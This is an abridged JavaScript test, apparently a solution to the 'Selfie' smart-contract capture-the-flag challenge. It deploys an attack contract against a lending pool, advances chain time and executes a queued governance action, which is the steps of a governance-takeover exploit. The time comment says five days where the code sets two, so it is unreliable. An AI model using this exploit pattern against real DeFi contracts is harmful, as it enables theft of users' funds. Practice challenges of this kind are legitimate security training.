...
describe('[Challenge] Selfie', function () {
  ...
  it('Execution', async function () {
    ...
    const AttackSelfie = await ethers.getContractFactory('AttackSelfie', player);
    const attackSelfie = await AttackSelfie.deploy(pool.address, token.address, player.address);
    await attackSelfie.attack();

    await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]); // 5 days
    const attackExcute = governance.connect(player);
    await attackExcute.executeAction(1);
  });
